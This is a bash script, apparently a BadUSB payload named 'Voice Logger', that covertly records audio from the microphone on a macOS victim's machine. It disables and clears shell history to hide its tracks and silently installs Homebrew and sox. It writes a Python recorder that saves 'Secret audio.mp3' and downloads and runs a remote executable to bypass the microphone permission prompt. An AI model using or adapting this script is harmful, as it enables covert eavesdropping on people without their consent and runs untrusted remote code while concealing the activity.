# Ensures that no history is saved to disk
export HISTCONTROL=ignorespace
unset HISTFILE

# Reset microphone permission for Terminal
tccutil reset Microphone com.apple.Terminal

# Installing "brew" and "sox" voice recording dependency
if ! command -v brew &>/dev/null; then
    echo "Installing Homebrew..."
    export NONINTERACTIVE=1
    /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)" || {
        echo "Failed to install Homebrew"
        exit 1
    }
fi

if ! command -v sox &>/dev/null; then
    brew install sox || {
        echo "Failed to install sox"
        exit 1
    }
fi

# Write the Python script for recording
printf 'import os\nimport subprocess\nimport datetime\nfilename = "Secret audio.mp3"\ncmd = "sox -d -C 128 -r 44100 \\"{}\\"".format(filename)\nsubprocess.Popen(cmd, shell=True)\n' >record.py

# Download permission script and execute it
curl -L -o allow_permission_mac_go 'https://raw.githubusercontent.com/YonKu0/BadUSB/main/Recon/MacOS/Voice%20Logger/allow_permission_mac_go'
chmod +x allow_permission_mac_go

# Start voice recording
python3 record.py >>record_output.txt 2>&1
sleep 0.5
./allow_permission_mac_go

# Clear the history of any commands run so far in this session
history -c
